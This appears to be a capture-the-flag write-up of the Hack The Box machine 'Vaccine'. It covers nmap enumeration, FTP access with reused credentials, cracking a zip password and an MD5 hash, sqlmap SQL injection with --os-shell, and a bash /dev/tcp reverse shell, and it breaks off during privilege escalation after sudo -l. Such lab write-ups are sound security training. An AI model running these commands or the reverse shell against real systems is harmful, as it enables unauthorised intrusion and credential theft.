# Vaccine
Notification: The words that are hyperlinked are to resources to learn more about the topic, protocol, or have useful information in them check them out if you want to learn more. 
# Enumeration

1. Nmap Scan 
  - First we want to start with a nmap scan and see what is available to us. to do this we will run the command below
    - `nmap -sS -A -oN nmap.txt 10.10.10.48`
    ![image](https://user-images.githubusercontent.com/29686845/133382328-9fb1414d-3ef7-440b-b5b9-96f3cbf89b49.png)
  - We see our open ports 21 FTP, 22 SSH, 80 HTTP Apache open. The main thing we notice is at the bottom of the screenshot or in our nmap scan we can see `http-title: MegaCorp Login`. This tells me that our credentials that we found in the previous machine [oopsie](https://github.com/Ajqx255/Hack-The-Box/tree/main/Oopsie) could potentially work to get us a secure shell through port 22. 
2. Port 22 SSH
  - lets try the root user that we obtained. Username: `ftpuser` Password: `mc@F1l3ZilL4` and connect with the command [SSH](https://www.openssh.com/manual.html) as seen below:
  
    ![image](https://user-images.githubusercontent.com/29686845/133384641-ee391953-ce3f-40a4-8a4e-c50499c56ed3.png)  
  - Which did not work, but it dawned on me as soon as we were denied permisson. (Dont Laugh at me... or do its fun to laugh and learn from our mistakes) there is a big hint in the name ftpuser. we have a open port and protocol that use ftp and [FileZilla](https://filezilla-project.org/) is a ftp software so we might have better luck there. 
3. Port 21 FTP
  - We will run the [FTP](https://linux.die.net/man/1/ftp) command as seen below:
    - `ftp 10.10.10.46`
    - ![image](https://user-images.githubusercontent.com/29686845/133386609-e80d051e-f851-4fe8-9552-d98a426f5aae.png)
  -  after using the same credentials as above we now see that we are succesfully connected lets see what we can find.
    - a simple `ls` command shows that there is a zip file nammed: backup.zip as seen below:
      ![image](https://user-images.githubusercontent.com/29686845/133498980-ed39df96-0c2b-4d83-adbb-9e3226339807.png)
  -  Lets extract the file back to our linux machine with using the [get](https://linux.die.net/man/1/get) command:
     - `get backup.zip`
  -  Now lets unzip the file with the command [unizp](https://linux.die.net/man/1/unzip) as seen below:
    - `unzip backup.zip`
    - When we do this we notice that it is asking for a password. Lets try the password for ftp user since it worked for usto gain access to the ftp server it might work here. 
    - ![image](https://user-images.githubusercontent.com/29686845/133500536-069549ad-1b43-4b25-8f26-cbcba8a35872.png)
    - the ftp password did not work either.
  - Since we do not know the password lets see if we can not brute force the password using [John the ripper](https://www.openwall.com/john/doc/)
    - We know we know we are going to use john to brute force the zip file, but we are going to have to do some prep work before we can actually use john. The first thing we are going to have to do is change the zip file into a format that john can read and crack. we will do this using [zip2john](https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/) 
    - We will run the command `zip2john backup.zip > hash.txt`
    - ![image](https://user-images.githubusercontent.com/29686845/133515214-b0de851d-4373-407f-8421-3d5d899f124e.png)
    - John can now read teh file so lets go agead and crack it with the follwoing command:
    - `sudo john hash.txt --fork=4 -w= /usr/share/wordlists/rockyou.txt`
      - incase you were wondering --fork is stating the amount of threads or instances it will run simultaniously.
      - -w= is selecting a wordlist that you provide. In kali linux there are already wordlists install under /usr/share/wordlists. 
    -  Time frames will change based on the resources you are running, but within a matter of seconds john was able to crack to the hash:
    -  ![image](https://user-images.githubusercontent.com/29686845/133854092-b087597b-2285-4c55-bcdf-2074946b63ca.png)
        - I had issues with running this command for some reason: It worked the one time and I am glad I took a screen shot of it then. I tried multiple times to look at it and figure out what I was doing wrong, but I couldn't find it. So I would say try it out first and if it doesn't work, dont go on a three day rabbit hole like I did just move on! lol. 

4. Opening the zip file.
  - Now that we have the password `741852963` we can go ahead and unzip the backup.zip file and take a look inside.
    - The results ended out as two files "index.php" & style.css". Both seem to be a programming language file. 
      - [PHP](https://www.php.net/manual/en/intro-whatis.php)
      - [CSS](https://developer.mozilla.org/en-US/docs/Learn/CSS/First_steps/What_is_CSS)
    - You can look into the folder using the cat command: `cat index.php`, the less command: `less index.php`, but personally I like to use [Virtual Studio Code](https://code.visualstudio.com/). It color coordinates everything and just makes it easier for me to read and write code.
    - Once opened on we see some useful infromation. We find a set of credentials as seen below.
      ![image](https://user-images.githubusercontent.com/29686845/134093351-ecc751ba-0c94-4f1b-91f1-e208daed70f3.png)
    - Username: `admin` & Password: `2cb42f8734ea607eefed3b70af13bbd3`
      - This does not seem like a regular password, or at least not one that would be easily used or even memorized. That is because it is not a password it is a hash. it as in md5 hash to be exact. How can we tell? well luckily for us they made it easy. in the screenshot above the section right before password its says md5. 

5. Cracking the Hash
  - Lets see if we can crack it using [CrackStation](https://crackstation.net/). you can use other tools like hashcat, but it will talk some time to complete compaired to the seconds it takes CrackStation
      ![image](https://user-images.githubusercontent.com/29686845/134099184-3a44f86e-954a-4643-a105-9b71f275d3f5.png)
  - We now know that the username and the password `admin` & `qwerty789`
  
# FootHold
1. Web Page Access
  - I tried connecting through port 22 and the credentails did not work. so lets scratch that all together.
  - We know port 80 http is open lets take a look at the webpage and see what we find.
    - The website brings us to a login page. I entered the credianls `admin | qwerty789`. This gets us a successful login.
  - There is not many relevant factors to the page, but it seems to be a car catalog with a functioning search bar that we might be able to exploit.
2. Exploiting the Webpage
  - Based on our last activity I used burpsuite to look into the page with site map and found that this webpage uses [cookies](https://www.kaspersky.com/resource-center/definitions/cookies). 
    ![image](https://user-images.githubusercontent.com/29686845/134251827-8e4fce2d-2cfb-4a9b-86d3-75b574b0b420.png)
    - We can also see this information when we inspect the web page source code under the storage tab.
      ![image](https://user-images.githubusercontent.com/29686845/134251976-0f94bc71-70b6-4c06-9364-f723c604d70f.png)
  - Now that we have the session id/cookie we can use [sqlmap](https://sqlmap.org/) to see if there are any weaknesses or vulnerable area's ind the database. 
    - `sqlmap -u http://10.10.10.46/dashboard.php?search=a --cookie=PHPSESSID=0h8aobaj9glv58eeme3bsb0l0g`
      - You PHPSESSID will probably be different make sure you use you session id and not this one.
      ![image](https://user-images.githubusercontent.com/29686845/134252721-bb9bd463-fd6a-49b1-b71b-5360f616c369.png)
      ![image](https://user-images.githubusercontent.com/29686845/134253363-15bc34b1-a0c6-47f0-a099-0a94b8363064.png)
    - The output of our command shows that the back end of the Database Management system [DBMS](https://www.altexsoft.com/blog/business/comparing-database-management-systems-mysql-postgresql-mssql-server-mongodb-elasticsearch-and-others/) is [PostgreSQL](https://www.postgresql.org/)
    - This means that sqlmap found that there were many injection vulnerabilietes within this database. 
      - looking in burpsuite will show you a better idea of this with issue definitions
        ![image](https://user-images.githubusercontent.com/29686845/134255984-052aef09-d44f-40d2-88da-7f7eb31c97ee.png)
    - sqlmap provides an easy way to get a shell with this vulnerabilites. it is as easy as adding `--os-shell` to the end of our previous command which I will show right below this
    - `sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=0h8aobaj9glv58eeme3bsb0l0g" --os-shell`
      - I had issues with this for this. It is always important to check you syntax very diligently. I was missing the last character on my cookie when I copied and pasted it into the command. That prevented my from obtaining a shell for a little bit. 
      - ALWAYS CHECK YOUR SYNTAX

3. OS-Shell
  - Now that we have access to our os shell lets a run a few inital commnads. 
    - `whoami` & `id`
    - These commands will tell us what user we are and what this use has access too. 
  - We are going to try and create a reverse shell like we did in the previous machine.
    - lets set up our listner with the netcat command `nc -lvnp 444`
    - now lets run the reverse shell creation command in our os shell 
    - `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
      ![image](https://user-images.githubusercontent.com/29686845/134260208-03155586-6647-4d0d-993b-0668e78f6ca3.png)
    - Now we have our shell! Lets upgrade that shell to a [tty](https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con) shell using the command below:
    - `SHELL=/bin/bash script -q /dev/null`
    - Now that we have our upgraded reverse shell lets move on to gaining privilege escilation

# Privlege Escalation
1. html
  - We know that we are looking at at a web server database so lets look at the `/var/www/html` and see if we can find anyhting in the web page files that the developer forgot to take out.
    - once there i recogonized the `dashbord.php` file that was in our URL earlier.
    - I took a look in there with the cat command. `cat dashboard.php`
    - inside the file we find the credentials for the user postgres
      ![image](https://user-images.githubusercontent.com/29686845/134261757-253936eb-f311-4c3b-b865-b8f8f618d174.png)
    - UN: `postgres` PW: `P@s5w0rd!`
2. Sudo
  - So now that we have the user password we can see if we have any sudo permissions.
    - run the command `sudo -l` (lowercase L). It prompts for our password: `P@s5w0rd!` and shows us where we have sudo permissions and what commands we can run as a sudo or super user. 
      ![image](https://user-images.githubusercontent.com/29686845/134262172-335c02c9-bc30-4948-ab00-9732d559c985.png)
    - 


    
